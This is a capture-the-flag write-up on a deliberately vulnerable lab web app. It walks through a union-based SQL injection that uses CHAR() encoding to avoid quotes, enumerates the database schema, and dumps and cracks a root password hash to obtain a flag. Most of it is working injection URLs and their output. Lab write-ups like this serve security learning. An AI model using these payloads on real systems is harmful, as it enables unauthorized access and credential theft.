# Bruteforce

We can brute force login by using simple common passwords

## Method

Thanks to the SQL injection flaw on search member and search image, we see a database called: "Member Brute Force"

### getting list of tables from bruteforce database

normally, in sql it would be something like this:

```

use Member_Brute_Force;
show tables;

```

but since we're using sql injection we have to use union and get the table names via select,

we can get the information we need from information_schema.tables

to see all available columns you could do 

```

select * from information_schema.tables

```

in our case, we're only interested in table names and to narrow it down further we could do

```

select table_name from information_schema.tables where table_schema='Member_Brute_Force'

```

however the php page will throw an error if we try to use quotes in our query, so we need a workaround

We can use CHAR() and python

By typing this in Terminal

```

python -c 'print([ord(c) for c in "Member_Brute_Force"]);'

```

We get the CHAR value for "Member_Brute_Force"
Which is

```

[77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101]

```

So intead of the earlier statement we can use

```

http://192.168.1.102/index.php?page=member&id=-1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)&Submit=Submit

```

#### result

```

ID: -1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
First name: id
Surname : 0

ID: -1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
First name: username
Surname : 0

ID: -1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) 
First name: password
Surname : 0

```

This gives us the column names of the table in the "Member_Brute_Force" database. which are id, username, and password

### Getting login information from the table

To list all usernames and passwords type:

```

http://192.168.1.102/index.php?page=member&id=-1 union select username, password from Member_Brute_Force.db_default&Submit=Submit

```

#### result 

```

ID: -1 union select username, password from Member_Brute_Force.db_default 
First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
ID: -1 union select username, password from Member_Brute_Force.db_default 
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8

```

Here we see that the username and password are the same LOL.
So we just have to decode the hash.

## How to get the flag

Decode the hash we got above
Which gives us the password "shadow"  
Login with the credentials:

```

username:   root
password:   shadow

```

We then get the flag B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2

## Prevention

Use checks and back-end validation to only allow complex passwords with a combination of uppercase and lowercase characters, numbers, and symbols.